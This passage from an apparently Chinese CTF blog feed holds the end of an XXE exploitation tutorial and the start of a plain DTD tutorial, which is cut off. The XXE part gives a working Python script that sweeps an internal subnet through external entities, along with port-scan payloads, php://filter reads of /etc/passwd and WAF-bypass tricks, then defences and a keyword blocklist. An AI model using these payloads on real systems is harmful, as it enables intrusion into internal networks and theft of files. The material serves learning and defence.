data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#Origtional XML that the server accepts</span></span><br><span class="line"><span class="comment">#&lt;xml&gt;</span></span><br><span class="line"><span class="comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class="line"><span class="comment">#&lt;/xml&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_xml</span>(<span class="params">string</span>):</span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_xml</span>(<span class="params">xml</span>):</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://靶机ip/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    coded_string = x.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">2</span>] <span class="comment"># a little split to get only the base64 encoded value</span></span><br><span class="line">    <span class="built_in">print</span> coded_string</span><br><span class="line"><span class="comment">#   print base64.b64decode(coded_string)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = <span class="built_in">str</span>(i)</span><br><span class="line">        ip = <span class="string">&#x27;10.0.0.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div><blockquote><p>要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子。我们可以尝试读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 文件</p></blockquote><h3 id="HTTP-内网主机端口扫描"><a href="#HTTP-内网主机端口扫描" class="headerlink" title="HTTP 内网主机端口扫描"></a><strong>HTTP 内网主机端口扫描</strong></h3><p>利用burpsuite辅助</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:端口号/&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>端口号部分用bp爆破</p><p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2）</p></blockquote><h3 id="内网盲注"><a href="#内网盲注" class="headerlink" title="内网盲注"></a>内网盲注</h3><blockquote><p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法</p><p>压缩：echo file_get_contents(“php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd”);<br>解压：echo file_get_contents(“php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-decode&#x2F;zlib.inflate&#x2F;resource&#x3D;&#x2F;tmp&#x2F;1”);</p></blockquote><p>我们考虑内网有没有东西，我们读取</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/arp</span><br><span class="line">/etc/host</span><br></pre></td></tr></table></figure></div><h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><h4 id="针对的WAF"><a href="#针对的WAF" class="headerlink" title="针对的WAF"></a>针对的WAF</h4><p>1.成熟的waf——使用自己的解析器预处理XML文档的WAFs。<br>2.基于正则表达式。仅搜索数据中的特定子字符串或正则表达式的WAFS。</p><h4 id="额外空格"><a href="#额外空格" class="headerlink" title="额外空格"></a>额外空格</h4><p>由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用<u>任意数量的空格</u>，因此攻击者可以在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入额外的空格，从而绕过此类WAF。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040003137.jpg"                      alt="image-20220501154908744"                ><figcaption>image-20220501154908744</figcaption></figure></p><h4 id="格式无效-链接到未知实体"><a href="#格式无效-链接到未知实体" class="headerlink" title="格式无效(链接到未知实体)"></a>格式无效(链接到未知实体)</h4><p>为了安全起见，一些WAF通常不会读取链接文件的内容，但外部资源链接还可以存在于声明&lt;!DOCTYPE&gt;中。这意味着未读取文件内容的WAF将不会读取文档中实体的声明,这样在后续正文中使用外部链接中的实体，就会被waf的xml解析器认为是未知实体，导致错误</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040003001.jpg"                      alt="image-20220501155941595"                ><figcaption>image-20220501155941595</figcaption></figure></p><h4 id="罕见编码"><a href="#罕见编码" class="headerlink" title="罕见编码"></a>罕见编码</h4><p>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。</p><blockquote><p>改变编码可以利用vscode的按其他编码保存</p></blockquote><p>例题：[CSAWQual 2019]Web_Unagi</p><h4 id="在一个文档中使用两种类型的编码"><a href="#在一个文档中使用两种类型的编码" class="headerlink" title="在一个文档中使用两种类型的编码"></a>在一个文档中使用两种类型的编码</h4><p>当包含编码属性的<?xml?>标记引用与文档首字节决定的字符集不同时，一些解析器更改编码，使文件的开头有一组字符，其余的是另一组编码。也就是说，不同的解析器可能在不同的时间转换编码。Java解析器(javax.xml.parsers)在<?xml?>结束后严格地更改字符集，而libxml2解析器可以在执行“编码”属性的值之后或在处理<?xml?>之前或之后切换编码。<br>只有在根本不处理这些文件时，比较成熟的WAF才能可靠地防止这些文件中的攻击。我们还必须记住，有许多同义词编码，例如UTF-32BE和UCS-4BE。此外，有些编码可能不同，但从编码文档初始部分 <code>&lt;?xml?&gt;</code>的角度来看，它们是兼容的。例如，看似UTF-8的文档可能包含字符串<code>&lt;?xml version=”1.0” encoding=”windows-1251”?&gt;</code>。<br>这里有一些例子。为了简明扼要，我们不把XXE放在文档里。<br>libxml2解析器将文档视为有效，但是，javax.xml.parsers set中的Java引擎认为它无效：</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040003488.jpg"                      alt="image-20220501161313385"                ><figcaption>image-20220501161313385</figcaption></figure></p><blockquote><p>控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。</p></blockquote><h2 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h2><h3 id="方案一：使用语言中推荐的禁用外部实体的方法"><a href="#方案一：使用语言中推荐的禁用外部实体的方法" class="headerlink" title="方案一：使用语言中推荐的禁用外部实体的方法"></a><strong>方案一：使用语言中推荐的禁用外部实体的方法</strong></h3><p><strong>PHP：</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure></div><p><strong>JAVA:</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure></div><p>java:<a class="link"   href="https://xz.aliyun.com/t/10774#toc-11" >https://xz.aliyun.com/t/10774#toc-11 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/3357#toc-20" >https://xz.aliyun.com/t/3357#toc-20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><strong>Python：</strong></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xxe</span>():</span><br><span class="line">    tree = etree.parse(<span class="string">&#x27;xml.xml&#x27;</span>, etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br><span class="line">    <span class="comment"># tree = lxml.objectify.parse(&#x27;xml.xml&#x27;, etree.XMLParser(resolve_entities=False))</span></span><br><span class="line">    <span class="keyword">return</span> etree.tostring(tree.getroot())</span><br></pre></td></tr></table></figure></div><blockquote><p>尝试改用defusedxml 是一个纯 Python 软件包，它修改了所有标准库 XML 解析器的子类，可以防止任何潜在的恶意操作。 对于解析不受信任的XML数据的任何服务器代码，建议使用此程序包。</p></blockquote><h3 id="方案二：手动黑名单过滤-不推荐"><a href="#方案二：手动黑名单过滤-不推荐" class="headerlink" title="方案二：手动黑名单过滤(不推荐)"></a><strong>方案二：手动黑名单过滤(不推荐)</strong></h3><p>过滤关键词：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DTD学习</title>
      <link href="/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p><p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p><h3 id="内部DOCTYPE声明"><a href="#内部DOCTYPE声明" class="headerlink" title="内部DOCTYPE声明"></a>内部DOCTYPE声明</h3><p>语法</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;  &lt;!--根元素是xml文件的根元素--&gt;</span><br></pre></td></tr></table></figure></div><p>带有 DTD 的 XML 文档实例</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Do not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></div><blockquote><h3 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h3><p><em>!DOCTYPE note</em> (第二行)定义此文档是 <em>note</em> 类型的文档。</p><p><em>!ELEMENT note</em> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p><p><em>!ELEMENT to</em> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT from</em> (第五行)定义 <em>from</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT heading</em> (第六行)定义 <em>heading</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT body</em> (第七行)定义 <em>body</em> 元素为 “#PCDATA” 类型</p></blockquote><h3 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h3><p>DTD位于XML源文件外部,语法</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>实例</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Do not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure></div><p>包含的note.dtd文件</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></div><h3 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h3><p>通过 DTD，每一个 XML 文件均可携带一个有关其自身格式的描述。</p><p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p><h2 id="构建模块"><a href="#构建模块" class="headerlink" title="构建模块"></a>构建模块</h2><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA </li><li>CDATA</li></ul><h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>由闭合标签及内容(文本或空)构成</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>提供<em>有关元素的额外信息</em>。</p><p>元素为空时</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;computer.gif&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>元素有内容时</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p><p><strong>下面的实体在 XML 中被预定义</strong></p><table><thead><tr><th align="left">实体引用</th><th align="left">字符</th></tr></thead><tbody><tr><td align="left"><code>&amp;lt;</code></td><td align="left">&lt;</td></tr><tr><td align="left"><code>&amp;gt;</code></td><td align="left">&gt;</td></tr><tr><td align="left"><code>&amp;amp;</code></td><td align="left">&amp;</td></tr><tr><td align="left"><code>&amp;quot;</code></td><td align="left">“</td></tr><tr><td align="left"><code>&amp;apos;</code></td><td align="left">‘</td></tr></tbody></table><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是会被解析的字符数据（parsed character data）,字符数据就是闭合标签之间的文本内容</p><p><strong>这些文本将被解析器检查实体以及标记。</strong>文本中的标签会被当作标记来处理，而实体会被展开。</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>此文本也会被解析<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据（character data）。<em>CDATA 是不会被解析器解析的文本。</em>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p>CDATA 部分由 <code>&lt;![CDATA[</code> 开始，由<code>]]&gt;</code> 结束：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">function matchwo(a,b)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">if (a &lt; b &amp;&amp; a &lt; 0) then</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  return 1;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">else</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  return 0;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>CDATA 部分不能包含字符串 “]]&gt;”。也不允许嵌套的 CDATA 部分。</p><p>标记 CDATA 部分结尾的 “]]&gt;” 不能包含空格或折行。</p></blockquote><h2 id="元素声明"><a href="#元素声明" class="headerlink" title="元素声明"></a>元素声明</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1⃣️&lt;!ELEMENT 元素名称 类别&gt;</span><br><span class="line">2⃣️&lt;!ELEMENT 元素名称 (元素内容)&gt;</span><br></pre></td></tr></table></figure></div><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>利用关键字<code>EMPTY</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 EMPTY&gt;</span><br></pre></td></tr></table></figure></div><p>案例</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--dtd中声明--&gt;</span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;</span><br><span class="line">&lt;!--XML中--&gt;</span><br><span class="line">&lt;br /&gt;</span><br></pre></td></tr></table></figure></div><h3 id="只有PCDATA的元素"><a href="#只有PCDATA的元素" class="headerlink" title="只有PCDATA的元素"></a>只有PCDATA的元素</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></div><h3 id="带有任何内容的元素"><a href="#带有任何内容的元素" class="headerlink" title="带有任何内容的元素"></a>带有任何内容的元素</h3><p>关键词<code>ANY</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 ANY&gt;</span><br></pre></td></tr></table></figure></div><h3 id="带有子元素（序列）的元素"><a href="#带有子元素（序列）的元素" class="headerlink" title="带有子元素（序列）的元素"></a>带有子元素（序列）的元素</h3><p>带有一个或多个子元素的元素通过圆括号中的子元素名进行声明：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1⃣️&lt;!ELEMENT 元素名称 (子元素名称 1)&gt;</span><br><span class="line">2⃣️&lt;!ELEMENT 元素名称 (子元素名称 1,子元素名称 2,.....)&gt; &lt;!--由逗号分隔开的序列进行声明并且按照相同的顺序出现在XML文档中--&gt;</span><br></pre></td></tr></table></figure></div><h4 id="不同的元素声明"><a href="#不同的元素声明" class="headerlink" title="不同的元素声明"></a>不同的元素声明</h4><ul><li><p>子元素只出现一次：语法为：</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> 元素名称 (子元素名称)&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>子元素出现零次或一次：语法为：</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> 元素名称 (子元素名称<span class="string">?)</span>&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>子元素出现零次或多次：语法为：</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> 元素名称 (子元素名称*)&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>子元素出现一次或多次：语法为：</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> 元素名称 (子元素名称+)&gt;</span><br></pre></td></tr></table></figure></div></li><li><p>子元素为多选一类型：语法为：</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">ELEMENT</span> 元素名称 (子元素名称<span class="number">1</span>|<span class="params">元素名称2</span>|子元素名称<span class="number">3</span>|<span class="params">...)&gt;</span></span><br><span class="line"><span class="params"># 这里则不需要遵循子元素出现的顺序来写声明，只需包含所有可能出现的子元素即可（也可以添加一些不可能出现的元素，当然这样写并没有必要)</span></span><br><span 